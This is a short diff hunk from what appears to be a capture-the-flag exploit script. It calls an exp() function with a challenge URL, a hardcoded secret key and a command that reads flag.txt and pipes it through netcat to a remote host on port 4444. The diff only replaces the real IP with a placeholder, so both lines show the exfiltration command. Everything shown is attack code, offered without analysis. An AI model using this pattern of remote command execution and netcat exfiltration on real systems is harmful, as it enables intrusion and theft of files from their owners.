@@ -54,6 +54,6 @@ def exp(url,SECRET_KEY,command):
 if __name__ == '__main__':
     url = 'http://00c50c9507e542faaa207fce86cce2ab2c6b6da510204f61.changame.ichunqiu.com/'
     SECRET_KEY = 'oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&j+#_+s-9=xcieci'
-    command = 'cat flag.txt | nc -4u -w1 45.76.101.190 4444'
+    command = 'cat flag.txt | nc -4u -w1 12.12.12.12 4444'
     exp(url,SECRET_KEY,command)
 ```
